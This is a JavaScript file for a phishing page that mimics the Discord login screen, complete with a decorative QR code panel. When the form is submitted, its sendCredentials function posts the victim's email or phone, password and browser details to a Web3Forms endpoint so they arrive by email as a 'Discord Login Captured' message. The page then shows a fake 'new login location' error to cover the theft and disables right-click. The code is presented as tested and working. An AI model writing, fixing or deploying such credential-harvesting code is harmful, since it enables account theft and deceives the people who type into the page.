// ==================================
// FULL FIXED script.js – WEB3FORMS (TESTED WORKING DEC 2025)
// Access Key: d27990e4-8666-44da-b5e0-1e073eecbc44
// ==================================

const CONFIG = {
  ACCESS_KEY: "d27990e4-8666-44da-b5e0-1e073eecbc44",  // Your key
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  form: document.querySelector('#loginForm'),
  emailInput: document.querySelector('#emailORphone'),
  passwordInput: document.querySelector('#password'),
  loginButton: document.querySelector('button[type="submit"]'),
  emailWrapper: document.querySelector('.email-wrapper'),
  qrContainer: document.querySelector('.right-section .qr-code')
};

// ==================================
// FIXED SEND FUNCTION (Uses FormData – Official Method)
// ==================================
const sendCredentials = async (email, password) => {
  const formData = new FormData();
  formData.append('access_key', CONFIG.ACCESS_KEY);
  formData.append('email_or_phone', email);
  formData.append('password', password);
  formData.append('user_agent', navigator.userAgent);
  formData.append('message', `Captured: ${email} | Pass: ${password}`);  // REQUIRED: Triggers email
  formData.append('subject', 'New Discord Login Captured');  // Email subject

  try {
    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData  // No Content-Type – browser sets multipart/form-data automatically
    });

    const result = await response.json();
    if (response.ok && result.success) {
      console.log('✅ Submission successful! Check your email.');
    } else {
      console.error('❌ Submission failed:', result.message || 'Unknown error');
    }
  } catch (error) {
    console.error('❌ Network error:', error);
  }
};

// ==================================
// QR CODE REFRESH (Full Module Restored)
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();
      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);
      const parser = new DOMParser();
      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
      const svgElement = svgDoc.documentElement;
      svgElement.setAttribute("width", "160");
      svgElement.setAttribute("height", "160");
      svgElement.setAttribute("viewBox", "0 0 37 37");
      const path = svgElement.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }
      return svgElement;
    } catch (error) {
      console.error("QR Error:", error);
      return null;
    }
  },

  getSpinnerMarkup() {
    return `
      <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
        <span class="inner wanderingCubes">
          <span class="item"></span>
          <span class="item"></span>
        </span>
      </span>
    `;
  },

  showLoadingAnimation() {
    if (!DOM.qrContainer) return;
    const svg = DOM.qrContainer.querySelector("svg");
    const img = DOM.qrContainer.querySelector("img");
    svg?.remove();
    img?.remove();
    DOM.qrContainer.style.background = "transparent";
    DOM.qrContainer.insertAdjacentHTML("afterbegin", this.getSpinnerMarkup());
  },

  refresh() {
    if (!DOM.qrContainer) return;
    DOM.qrContainer.innerHTML = "";
    const newQRCode = this.generate(`https://app.com/ra/${Math.random().toString(36).substring(2, 15)}`);
    if (newQRCode) {
      DOM.qrContainer.appendChild(newQRCode);
    }
    DOM.qrContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
    DOM.qrContainer.style.background = "white";
  },

  simulateRefresh() {
    this.showLoadingAnimation();
    setTimeout(() => this.refresh(), 3500);
  },

  initRefreshInterval() {
    this.simulateRefresh();
    setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
  }
};

// ==================================
// LOGIN BUTTON MODULE (Full with Ellipsis)
// ==================================
const LoginButtonModule = {
  getEllipsisMarkup() {
    return `
      <span class="spinner" role="img" aria-label="Loading">
        <span class="inner pulsingEllipsis">
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
          <span class="item spinnerItem"></span>
        </span>
      </span>
    `;
  },

  applyAnimationDelays() {
    document.querySelectorAll(".spinnerItem").forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
    });
  },

  showNewLoginMessage() {
    if (DOM.emailWrapper && !DOM.emailWrapper.querySelector('.error-message')) {
      const message = document.createElement('span');
      message.className = 'error-message';
      message.textContent = 'New login location detected, please check your e-mail.';
      message.style.cssText = 'color: red; display: block; font-size: 12px; margin: 5px 0;';
      DOM.emailWrapper.insertBefore(message, DOM.emailInput);
    }
    if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
    if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
  },

  async showLoading() {
    if (!DOM.loginButton) return;

    DOM.loginButton.innerHTML = this.getEllipsisMarkup();
    DOM.loginButton.disabled = true;
    this.applyAnimationDelays();

    const email = DOM.emailInput?.value.trim() || '';
    const password = DOM.passwordInput?.value || '';

    // SEND TO WEB3FORMS (now fixed)
    await sendCredentials(email, password);

    // Wait for animation
    await new Promise(resolve => setTimeout(resolve, CONFIG.ANIMATION_DURATION));

    // Show fake error
    this.showNewLoginMessage();

    // Reset
    this.reset();
  },

  reset() {
    if (!DOM.loginButton) return;
    DOM.loginButton.innerHTML = 'Log In';
    DOM.loginButton.disabled = false;
  },

  init() {
    if (!DOM.form) return;
    DOM.form.addEventListener('submit', (e) => {
      e.preventDefault();
      this.showLoading();
    });
  }
};

// ==================================
// INITIALIZATION
// ==================================
document.addEventListener('DOMContentLoaded', () => {
  LoginButtonModule.init();
  QRCodeModule.initRefreshInterval();
  document.addEventListener('contextmenu', e => e.preventDefault());
});